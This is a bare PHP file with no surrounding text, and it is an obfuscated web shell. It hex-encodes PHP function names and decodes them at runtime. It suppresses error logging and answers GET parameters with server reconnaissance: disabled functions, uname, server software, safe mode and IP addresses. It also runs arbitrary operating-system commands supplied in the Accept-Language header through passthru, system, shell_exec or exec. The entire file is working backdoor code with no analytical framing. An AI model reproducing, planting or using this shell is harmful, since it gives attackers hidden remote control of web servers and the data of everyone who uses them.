<?php $hex=array('7365745f74696d655f6c696d6974','6572726f725f7265706f7274696e67','696e695f736574','5f474554','696e695f676574','7068705f756e616d65','676574656e76','7061737374687275','73797374656d','7368656c6c5f65786563','65786563');function hlx($rr){$xx='';for($c=0;$c<strlen($rr);$c+=2){$xx.=chr(hexdec($rr[$c].$rr[$c+1]));}return (string) $xx;}$vcx=count($hex);for($i=0;$i<$vcx;$i++){$aizawa[]=hlx($hex[$i]);}$aizawa[0](0);$aizawa[1](0);@$aizawa[2]('error_log',NULL);@$aizawa[2]('log_errors',0);@$aizawa[2]('output_buffering',0);if(isset(${$aizawa[3]}['disable_functions'])){echo(!empty($aizawa[4]('disable_functions'))?$aizawa[4]('disable_functions'):'NONE');die();}if(isset(${$aizawa[3]}['unamea'])){echo $aizawa[5]('a');die();}if(isset(${$aizawa[3]}['server'])){$server_software=(!empty($aizawa[6]('SERVER_SOFTWARE')))?$aizawa[6]('SERVER_SOFTWARE'):'';echo $server_software;die();}if(isset(${$aizawa[3]}['safe_mode'])){$safe_mode=($aizawa[4]('safe_mode')==1)?'ON':'OFF';echo $safe_mode;die();}if(isset(${$aizawa[3]}['server_ip'])){$server_ip=(!empty($aizawa[6]('SERVER_ADDR')))?$aizawa[6]('SERVER_ADDR'):'';echo $server_ip;die();}if(isset(${$aizawa[3]}['client_ip'])){$client_ip=(!empty($aizawa[6]('REMOTE_ADDR')))?$aizawa[6]('REMOTE_ADDR'):'';echo $client_ip;die();}if(${$aizawa[3]}['cmd']=="passthru"){$aizawa[7]($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif(${$aizawa[3]}['cmd']=="system"){$aizawa[8]($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif(${$aizawa[3]}['cmd']=="shell_exec"){echo $aizawa[9]($_SERVER['HTTP_ACCEPT_LANGUAGE']);}elseif(${$aizawa[3]}['cmd']=="exec"){echo $aizawa[10]($_SERVER['HTTP_ACCEPT_LANGUAGE']);}